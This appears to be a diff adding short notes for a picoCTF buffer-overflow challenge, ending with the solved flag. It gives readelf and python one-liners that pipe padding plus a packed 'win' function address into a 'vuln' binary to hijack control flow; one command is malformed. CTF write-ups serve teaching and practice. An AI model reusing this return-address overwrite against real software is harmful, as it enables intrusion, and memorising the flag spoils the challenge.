@@ -1,0 +1,15 @@
+run the file vuln
+
+try readelf -s vuln | grep win
+
+take the address of win function since that's where you trying to jump to.
+
+
+using python to cause buffer overflow:
+
+	1. python -c "A"* 50 | ./vuln            (Try To Overflow Buffer)
+	2. USAGE OF struct module in python:
+		python -c "import struct; print 'A'*45 + struct.pack('<I', 0x080485cb)" | ./vuln
+
+
+FLAG: picoCTF{addr3ss3s_ar3_3asyd69e032d}
